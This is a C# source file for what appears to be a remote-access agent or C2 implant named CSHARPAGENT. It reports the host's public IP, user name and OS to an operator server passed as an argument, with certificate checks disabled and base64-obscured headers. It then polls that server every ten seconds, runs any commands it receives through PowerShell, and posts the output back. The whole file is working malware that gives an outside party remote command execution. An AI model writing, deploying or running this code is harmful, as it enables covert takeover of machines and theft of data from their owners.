using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.ComponentModel;
using System.Net.Http;
using System.Net;
using System.Text;  // for class Encoding
using System.IO;    // for StreamReader
using System.Web;
using Newtonsoft.Json;
using System.Threading;

namespace CSHARPAGENT

{
    public class json_refresh_token 
    {
        public string token { get; set; }
    }
    public class Json_Format
    {
        public int agent_id { get; set; }
        public string os { get; set; }
        public string ip { get; set; }
        public string user { get; set; }
        public List<string> completed_commands { get; set; }
        public List<string> pending_commands { get; set; }
    }

    public class check_in_tokens 
    {
        public string token { get; set; }
        public string refresh { get; set; }
        public string id { get; set; }
        public string rev { get; set; }

    }


    public class json_db_format
    {
        public string _id { get; set; }
        public string _rev { get; set; }
        public int agent_id { get; set; }
        public string os { get; set; }
        public string ip { get; set; }
        public string user { get; set; }
        public List<string> completed_commands { get; set; }
        public List<string> pending_commands { get; set; }
    }


    public class Program
    {

        static string RunCommand(string command)
        {
            var process = new Process();
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = "-c " + command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();
            //* Read the output (or the error)
            string output = process.StandardOutput.ReadToEnd().Trim();
            //Console.WriteLine(output);
            //string err = process.StandardError.ReadToEnd().Trim();
            //Console.WriteLine(err);
            process.WaitForExit();
            return output;

        }

  


        static void Main(string[] args)
        {
            if (args.Length == 0) {
                System.Console.WriteLine("Missing IP or HOSTAME in the following format 10.0.0.150:443");
                System.Environment.Exit(1);
            }
            Console.WriteLine(args[0]);
            // running commands to get initial information
            var iprequest = (HttpWebRequest)WebRequest.Create("http://ipinfo.io/ip");
            var ipresponse = (HttpWebResponse)iprequest.GetResponse();
            string ip_resp = new StreamReader(ipresponse.GetResponseStream()).ReadToEnd().Trim();
            string user_result = RunCommand("whoami").Trim();
            //string sysinfo_result = RunCommand("ver").Trim(); // only if using cmd for RunCommand function
            string sysinfo_result = RunCommand("gwmi win32_operatingsystem | % caption").Trim(); // if using powershell
            string sysinfo = sysinfo_result.Replace("\n", String.Empty);
            List<string> pending_commandz = new List<string>();
            List<string> completed_commandz = new List<string>();
            //generating random number
            Random random = new Random();
            int agent_id_result = random.Next(1000, 90000);
            // creating instance of class for first get request parameters
            Json_Format json_doc = new Json_Format
            {
                agent_id = agent_id_result,
                os = sysinfo_result,
                ip = ip_resp,
                user = user_result,
                pending_commands = new List<string> { },
                completed_commands = new List<string> { }


            };
            //converting object to string
            string json_check_in = JsonConvert.SerializeObject(json_doc, Formatting.Indented);
            //ssl turned off below
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            // POST REQUEST TO FIRST_CHECK_IN
            // POST request below
            var request = (HttpWebRequest)WebRequest.Create(String.Format("https://{0}/first_check_in",args[0]));
            request.Method = "POST";
            request.ContentType = "application/json";
            request.Headers.Add("User-Agent", "QmxhY2tUYWJieQo=");
            request.Headers.Add("Agent", "TGVhcm5pbmdDVG9CRWxpdGUK");
            using (var streamWriter = new StreamWriter(request.GetRequestStream())) {
                //Console.WriteLine(json_check_in);
                streamWriter.Write(json_check_in);
            }
            //send post request
            var response = (HttpWebResponse)request.GetResponse();
            //get resonse back
            var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
           // Console.WriteLine(request.Headers);
           // Console.WriteLine(responseString);
            var check_in_result = JsonConvert.DeserializeObject<check_in_tokens>(responseString);
            // class created above and response is serialized into it.
            //Console.WriteLine(check_in_result.token);
            //Console.WriteLine(check_in_result.refresh);
            //Console.WriteLine(check_in_result.id);
            //Console.WriteLine(check_in_result.rev);
            // POST REQUEST TO FIRST_CHECK_IN DONE
            //Starting looping GET request on /poll
            
            while (true)
            {
                Thread.Sleep(10000);
                //while TRUE!!!!
                // while loop starts here
                var polling = (HttpWebRequest)WebRequest.Create(String.Format("https://{0}/poll",args[0]));
                polling.Method = "GET";
                polling.ContentType = "application/json";
                polling.Headers.Add("doc_id", check_in_result.id);
                polling.Headers.Add("Authorization", "Bearer " + check_in_result.token);
                var polling_resp = (HttpWebResponse)polling.GetResponse();
                var polling_resp_string = new StreamReader(polling_resp.GetResponseStream()).ReadToEnd();
                //Console.WriteLine(polling_resp_string);
                var polling_final_result = JsonConvert.DeserializeObject<json_db_format>(polling_resp_string);
                // get request is done, the document is in the polling_final_result class 
                // access variables via polling_final_result.pending_commands
                if (polling_final_result.pending_commands == null || polling_final_result.pending_commands.Count == 0)
                {
                    //Console.WriteLine("no command yet");
                    //getting new token anyways
                    var refresh_req = (HttpWebRequest)WebRequest.Create(String.Format("https://{0}/refresh",args[0]));
                    refresh_req.Method = "GET";
                    refresh_req.ContentType = "application/json";
                    refresh_req.Headers.Add("Authorization", "Bearer " + check_in_result.refresh);
                    var refresh_resp = (HttpWebResponse)refresh_req.GetResponse();
                    var refresh_resp_string = new StreamReader(refresh_resp.GetResponseStream()).ReadToEnd();
                    //Console.WriteLine("NEW TOKEN BELOW \n");
                    //Console.WriteLine(refresh_resp_string);
                    // deserializing token into object
                    var refresh_token_json_obj = JsonConvert.DeserializeObject<json_refresh_token>(refresh_resp_string);
                    // adding new token to check in result.token  aka variable that holds the token the hold time
                    check_in_result.token = refresh_token_json_obj.token;
                }
                else
                {
                   // Console.WriteLine("found a command");
                    // running loop and adding command results to polling result json object
                    for (int i = 0; i < polling_final_result.pending_commands.Count; i++)
                    {
                        //Console.WriteLine(polling_final_result.pending_commands[i]);
                        string cmd_result = RunCommand(polling_final_result.pending_commands[i]).Trim();
                        polling_final_result.completed_commands.Add(cmd_result);
                        //polling_final_result.completed_commands.Add(RunCommand(polling_final_result.pending_commands[i]).Trim());
                        //added commands to completed commands list
                    }
                    // empties the pending commands list cause they should have all just been ran
                    polling_final_result.pending_commands.Clear();
                    // POST JSON OBJECT BACK
                    var posting_commands = (HttpWebRequest)WebRequest.Create(String.Format("https://{0}/poll",args[0]));
                    posting_commands.Method = "POST";
                    posting_commands.ContentType = "application/json";
                    posting_commands.Headers.Add("doc_id", check_in_result.id);
                    posting_commands.Headers.Add("Authorization", "Bearer " + check_in_result.token);
                    // serializing the post data which is polling_final_result object
                    string completed_command_payload = JsonConvert.SerializeObject(polling_final_result, Formatting.Indented);
                    //writing it to a stream
                    using (var LaststreamWriter = new StreamWriter(posting_commands.GetRequestStream()))
                    {
                        //Console.WriteLine(completed_command_payload);
                        LaststreamWriter.Write(completed_command_payload);
                    }
                    var completed_commands_response = (HttpWebResponse)posting_commands.GetResponse();
                    //response back in a string below
                    var complted_commands_responseString = new StreamReader(completed_commands_response.GetResponseStream()).ReadToEnd();
                    /// now refresh your access token before next loops starts
                    var refresh_req = (HttpWebRequest)WebRequest.Create(String.Format("https://{0}/refresh",args[0]));
                    refresh_req.Method = "GET";
                    refresh_req.ContentType = "application/json";
                    refresh_req.Headers.Add("Authorization", "Bearer " + check_in_result.refresh);
                    var refresh_resp = (HttpWebResponse)refresh_req.GetResponse();
                    var refresh_resp_string = new StreamReader(refresh_resp.GetResponseStream()).ReadToEnd();
                    //Console.WriteLine("NEW TOKEN BELOW \n");
                    //Console.WriteLine(refresh_resp_string);
                    // deserializing token into object
                    var refresh_token_json_obj = JsonConvert.DeserializeObject<json_refresh_token>(refresh_resp_string);
                    // adding new token to check in result.token  aka variable that holds the token the hold time
                    check_in_result.token = refresh_token_json_obj.token;
                    // new token takes place of old token




                    /// Attempting to refresh token with get request to /refresh

                }
            }
        }
    }
}

